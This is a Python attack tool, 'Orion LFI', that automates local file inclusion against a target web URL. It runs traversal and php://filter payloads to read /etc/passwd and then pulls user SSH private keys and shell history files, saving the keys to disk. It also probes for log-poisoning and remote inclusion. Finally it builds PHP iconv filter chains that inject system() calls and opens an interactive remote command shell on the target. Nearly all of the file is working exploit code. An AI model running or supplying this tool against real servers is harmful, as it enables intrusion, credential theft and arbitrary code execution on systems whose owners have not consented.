import requests
import re
import base64
import argparse
import sys
import urllib.parse
from urllib.parse import urlparse
import os
from colorama import Fore, Back, Style

users = []
file_to_use = "php://temp"
TIMEOUT_VALUE = 20
session_cookies = {}
RESPONSE_SIZE_WITH_VALID_FILE = 0
RESPONSE_SIZE_WITH_NO_FILE = 0
RESPONSE_SIZE_WITH_OUT_PARAMETER = 0
Vaild_File_Name = ""
web_root = "/var/www/html"

ERROR_INDICATORS = [
    "no such file", 
    "not found", 
    "failed to open", 
    "permission denied", 
    "error", 
    "access denied",
    "allow_url_include", 
    "url open stream failed"
]

banner = r"""

________        .__               
\_____  \_______|__| ____   ____  
 /   |   \_  __ \  |/  _ \ /    \ 
/    |    \  | \/  (  <_> )   |  \
\_______  /__|  |__|\____/|___|  /
        \/                     \/ 

            ╦   ╔═╗ ╦
            ║   ╠╣  ║
            ╩═╝ ╚   ╩
Local File Inclusion Auomation - Tools
"""
print(banner)

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}

iconv_filter_exexute_id = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"

Payloads = [
    # General Payloads
    "../../../../../../etc/passwd",
    "..//..//..//..//..//..//etc/passwd",
    "/../../../../../../etc/passwd",
    "a/.....///.....///.....///.....//etc/passwd",
    "/.....///.....///.....///.....//etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "/....//....//....//....//....//etc/passwd",
    "....//....//....//etc/passwd",
    "....////....////....////etc/passwd",
    # Base64 Filter Payloads
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=/var/www/html/index.php"
    # URL Encoded Payloads
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%255c..%255c..%255cetc/passwd",
    # Absloute Path Payload
    "/etc/passwd",
    # web root Paylods
    "/var/www/html/../../../../../../etc/passwd",
    "/var/www/html/images/../../../../../../etc/passwd",
    "/var/www/images/../../../etc/passwd",
    # Null Byte Payloads
    "../../../../../../etc/passwd%00.png",
    "../../../etc/passwd%00.jpg",
    "../../../../../../etc/passwd%00",
    "/etc/passwd%00",
]


def normal_state(url,vaild_file):
    # Define The Global Variables
    global RESPONSE_SIZE_WITH_VALID_FILE,RESPONSE_SIZE_WITH_NO_FILE,RESPONSE_SIZE_WITH_OUT_PARAMETER
    url_with_vaild_file = url + vaild_file
    res = requests.get(url=url_with_vaild_file,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    RESPONSE_SIZE_WITH_VALID_FILE = len(res.text.strip())
    res = requests.get(url=url,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    RESPONSE_SIZE_WITH_NO_FILE = len(res.text.strip())
    url_with_out_parameter = url.split('?')
    url_with_out_parameter = url_with_out_parameter[0]
    res = requests.get(url=url_with_out_parameter,cookies=session_cookies,timeout=TIMEOUT_VALUE)
    RESPONSE_SIZE_WITH_OUT_PARAMETER = len(res.text.strip()) 
    

def check_access_log(payload):
    print(f"\n\t{Style.BRIGHT}Checking Access To Apache/HTTPD Logs{Style.RESET_ALL}\n")
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/apache/access.log"
    ]
    found = False
    for path in log_paths:
        access_log_payload = payload.replace("/etc/passwd", path)
        print(access_log_payload)
        try:
            res = requests.get(url=access_log_payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
            content = res.text.strip()
            if "HTTP/" in content and "etc/passwd" in content:
                print(f" {Style.BRIGHT}{Fore.RED}[Found-High]{Style.RESET_ALL} Access.log is Accessible at: '{path}'")
                print(f" {Style.BRIGHT}{Fore.BLUE}[Tip] - {Style.RESET_ALL}{Style.BRIGHT}'Potential RCE via Log Poisoning!'{Style.RESET_ALL}\n")
                print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
                found = True
                break 
        except Exception:
            continue
    if not found:
        print(f"{Fore.MAGENTA}[-] Failed to Access access.log (File not found or Permission Denied){Style.RESET_ALL}\n")
        print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)


def Test_LFI(malicous_url):
    res = requests.get(url=malicous_url, cookies=session_cookies)
    if "root" in res.text:
        Extaxt_Real_Users(res.text)
        Extract_hostname(malicous_url)
        check_access_log(malicous_url)
        Extract_user_ssh_keys(malicous_url)
        test_rfi()
        Extract_history_files(malicous_url)
        testing_base64_encode_filter(malicous_url)
        testing_rce()
        return True
    return False

def Extract_history_files(payload):
    history_files = [".bash_history", ".zsh_history"]
    if users:
        print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
        print(f"\n\t{Style.BRIGHT}Extracting User's History Files{Style.RESET_ALL}\n")
        found_any = False
        for user in users:
            for history_file in history_files:
                history_file_payload = payload.replace("etc/passwd", f"home/{user}/{history_file}")
                try:
                    res = requests.get(url=history_file_payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
                    content = res.text.strip()
                    payload_content_length = len(content)
                    if res.status_code == 200 and not any(error in content for error in ERROR_INDICATORS) and payload_content_length != RESPONSE_SIZE_WITH_VALID_FILE and payload_content_length != RESPONSE_SIZE_WITH_NO_FILE and payload_content_length != RESPONSE_SIZE_WITH_OUT_PARAMETER: 
                        print(f" {Style.BRIGHT}{Fore.YELLOW}[Potential]{Style.RESET_ALL} - There is Different of Response Size for User {user}, Payload {history_file_payload}{Style.RESET_ALL}")
                        found_any = True
                    
                except Exception:
                    continue
        if not found_any:
            print("🛡️ No History Files Found")
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)


                   

def testing_base64_encode_filter(payload):
    print(f"\n\t{Style.BRIGHT}Testing for PHP base64-encode filter{Style.RESET_ALL}\n")
    base64_filter_payload = f"{base_url}php://filter/convert.base64-encode/resource={Vaild_File_Name}"
    try:
        res = requests.get(url=base64_filter_payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
        content = res.text.strip()
        content_length = len(content)
        if not any(error in content.lower() for error in ERROR_INDICATORS) and content_length != RESPONSE_SIZE_WITH_VALID_FILE and content_length != RESPONSE_SIZE_WITH_NO_FILE and content_length != RESPONSE_SIZE_WITH_OUT_PARAMETER:
            print(f" {Style.BRIGHT}{Fore.YELLOW}[Potential]{Style.RESET_ALL} - There is Different of Response Size , Check it Manually{Style.RESET_ALL}")
            print(f" {Style.BRIGHT}{Fore.WHITE}[*]{Style.RESET_ALL} - Payload Used: {Style.BRIGHT}{Fore.WHITE}({base64_filter_payload}){Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}{Style.BRIGHT}[INFO]{Style.RESET_ALL} - base64-encode filter Unsupported or Failed")
    except Exception as e:
        print(f"🛡️ Error: {e}")
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)

def Extract_hostname(payload):
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
    hostname_payload = payload.replace("etc/passwd", "etc/hostname")
    print(f"You Can Try to Get the HostName with this Payload {hostname_payload}")
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
  


def Extract_user_ssh_keys(payload):
    ssh_files = [
        ".ssh/id_rsa", 
        ".ssh/id_ed25519", 
        ".ssh/id_ecdsa", 
        ".ssh/id_dsa",
        ".ssh/authorized_keys"
    ]
    
    if 'users' in globals() and users:
        
        print(f"\n\t{Style.BRIGHT}Enumeration User's SSH Keys{Style.RESET_ALL}")
        found_any_key = False
        
        for user in users:
            print(f"\nChecking user: {user}...")
            
            for ssh_file in ssh_files:
                base_path = f"root/{ssh_file}" if user == "root" else f"home/{user}/{ssh_file}"
                ssh_key_payload = payload.replace("etc/passwd", base_path)
                
                try:
                    res = requests.get(url=ssh_key_payload, cookies=session_cookies, timeout=TIMEOUT_VALUE)
                    content = res.text
                    
                    
                    is_valid_key = ("-----BEGIN" in content) or any(marker in content for marker in ["ssh-rsa", "ssh-ed25519"])
                    
                    if res.status_code == 200 and not any(error in content.lower() for error in ERROR_INDICATORS) and is_valid_key:
                        clean_content = re.sub(r'<[^>]+>', '', content).strip()
                        
                        
                        final_key = ""
                        if "-----BEGIN" in clean_content:
                            start_index = clean_content.find("-----BEGIN")
                            end_marker = "-----END"
                            end_index = clean_content.find(end_marker)
                            
                            if end_index != -1:
                                temp_content = clean_content[start_index:]
                                lines = temp_content.splitlines()
                                final_lines = []
                                for line in lines:
                                    final_lines.append(line)
                                    if end_marker in line:
                                        break
                                final_key = "\n".join(final_lines)
                            else:
                                final_key = clean_content[start_index:]
                        else:
                            lines = clean_content.splitlines()
                            final_key = "\n".join([line.strip() for line in lines if line.strip().startswith("ssh-")])

                        if final_key:
                            file_type = "Private_Key" if "-----BEGIN" in final_key else "Public_Key"
                            print(f" {Style.BRIGHT}{Fore.RED}[Found-High]{Style.RESET_ALL} - Found Valid {file_type} for User: {user}")
                            print(f" {Style.BRIGHT}{Fore.WHITE}[*]{Style.RESET_ALL} - Payload Used: {Style.BRIGHT}{Fore.WHITE}({ssh_key_payload}){Style.RESET_ALL}")
                            
                            clean_filename = f"ssh_{user}_{ssh_file.replace('.ssh/', '')}.txt"
                            with open(clean_filename, "w") as f:
                                f.write(final_key.strip())
                            
                            print(f" {Fore.BLUE}{Style.BRIGHT}[INFO]{Style.RESET_ALL} - Key saved to: {clean_filename}")
                            found_any_key = True
                            
                except Exception:
                    continue
        
        if not found_any_key:
            print("\n🛡️ No SSH Keys Found or Access Denied\n")
    
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)


def Extaxt_Real_Users(content):
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
    print(f"\n\t{Style.BRIGHT}Extract Users From /etc/passwd{Style.RESET_ALL}\n")
    clean_text = re.sub(r'<[^>]+>', '', content)
    lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
    user_pattern = r"^([^:]+):.*(/bin/bash|/bin/sh|/bin/zsh|/sh|/bash)$"
    found_users = []
    for line in lines:
        match = re.search(user_pattern, line)
        if match:
            user = match.group(1)
            if user not in users:
                users.append(user)
            found_users.append(user)
            print(f" - {user}")

    if not found_users:
        print("None User Found")
    else:
        print(f"\n{Fore.CYAN}{Style.BRIGHT}[INFO] - {Style.RESET_ALL}{Style.BRIGHT}{len(found_users)} Users Found{Style.RESET_ALL}")


def test_rfi():
    print(f"\n\t{Style.BRIGHT}Testing for RFI (Remote File Inclusion) {Style.RESET_ALL}\n")
    test_url = "https://www.google.com/robots.txt"
    
    try:
        full_rfi_url = base_url + test_url
        res = requests.get(url=full_rfi_url, cookies=session_cookies, timeout=TIMEOUT_VALUE)
        content = res.text
        if res.status_code == 200  and "User-agent: *" in content and not any(error in content.lower() for error in ERROR_INDICATORS):
            
            print(f" {Style.BRIGHT}{Fore.RED}[Found-High]{Style.RESET_ALL} -  RFI Vulnerability Confirmed! , Extrnal links Allowed")
            print(f"{Style.BRIGHT}{Fore.WHITE}[*]{Style.RESET_ALL} -  Payload used: {Style.BRIGHT}{Fore.WHITE}({full_rfi_url}){Style.RESET_ALL}")
            print("🚀 Server is fetching and rendering remote URLs.")
        else:
            print(f"{Fore.MAGENTA}[-] - RFI Seems to be Disabled{Style.RESET_ALL}")
    except Exception as e:
        print(f" {Fore.CYAN}[Error]{Style.RESET_ALL} -  RFI Test failed: {e}")
    
    
        

def testing_rce():
    print(f"\n\t{Style.BRIGHT}Testing for RCE via iconv filter{Style.RESET_ALL}\n")
    checking_rce_payload = f"{base_url}{iconv_filter_exexute_id}"
    res = requests.get(url=checking_rce_payload, cookies=session_cookies)
    if "uid" in res.text.strip():
        print(f" {Style.BRIGHT}{Fore.RED}[Found-High] - RCE Found{Style.RESET_ALL}")
        print(res.text.strip())
        print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
        open_shell()
    else:
        print(f"🔹 Failed to Preform RCE")
        print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)

def open_shell():
    print("\n" + "="*50)
    print(f" {Style.BRIGHT}{Fore.YELLOW}>>> Interactive PHP Filter Chain Shell <<< {Style.RESET_ALL}")
    print(" (type 'exit' to quit | Ctrl+C to stop)")
    print("="*50)
    try:
        while True:
            shell_command = input("Shell> ").strip()
            if not shell_command: continue
            if shell_command.lower() in ['exit', 'quit']: break
            php_command = r"<?php system('cmd');\n ?>"
            php_command = php_command.replace('cmd', shell_command)
            chain = php_command.encode('utf-8')
            base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
            ready_payload = generate_filter_chain(base64_value)
            Exexute_hacker_command(ready_payload)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted.")
    except Exception as e:
        print(f"\n[!] Error: {e}")

def generate_filter_chain(chain, debug_base64 = False):
    encoded_chain = chain
    filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        filters += "convert.base64-decode"
    return f"php://filter/{filters}/resource={file_to_use}"

def Exexute_hacker_command(command):
    rce_command_payload = f"{base_url}{command}"
    res = requests.get(url=rce_command_payload, cookies=session_cookies)
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)
    print(res.text.strip())
    print(f"{Style.BRIGHT}-{Style.RESET_ALL}" * 30)

def generate_custom_lfi_payload(url,exsist_file):
    target_file="etc/passwd"
    parsed_url = urlparse(url)
    traversal = "../" * 5
    double_traversal = "....//" * 5
    Payloads.append(f"{web_root}/{traversal}{target_file}")
    Payloads.append(f"{web_root}/{double_traversal}{target_file}")
    Payloads.append(f"/{double_traversal}{target_file}")
    Payloads.append(f"/{double_traversal}{target_file}")
    Payloads.append(f"{exsist_file}/{traversal}/{target_file}")
    Payloads.append(f"{exsist_file}/{double_traversal}/{target_file}")
    Payloads.append(f"{exsist_file}/{double_traversal}{target_file}")
    Payloads.append(f"php://filter/convert.base64-encode/resource={exsist_file}/{traversal}{target_file}")
    Payloads.append(f"php://filter/convert.base64-encode/resource={exsist_file}/{double_traversal}{target_file}")
    
    


def parse_cookies(cookie_string):
    cookies = {}
    if cookie_string:
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
    return cookies

def take_args():
    parser = argparse.ArgumentParser(description="Recon + Payload Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--cookie", help="Cookie header")
    parser.add_argument("-f", "--file", help="Please Enter Exsists and Valid File")
    
    args = parser.parse_args()
    global session_cookies, base_url
    if args.cookie:
        session_cookies = parse_cookies(args.cookie)
    return args

if __name__ == "__main__":
    args = take_args()
    base_url = args.url
    vaild_file = args.file
    Vaild_File_Name = vaild_file
    if vaild_file:
        normal_state(base_url,vaild_file)
        generate_custom_lfi_payload(base_url,Vaild_File_Name)
    
    for payload in Payloads:
        encoded_payload = urllib.parse.quote(payload, safe="/%")
        full_url = base_url + encoded_payload
        if Test_LFI(full_url):
            break
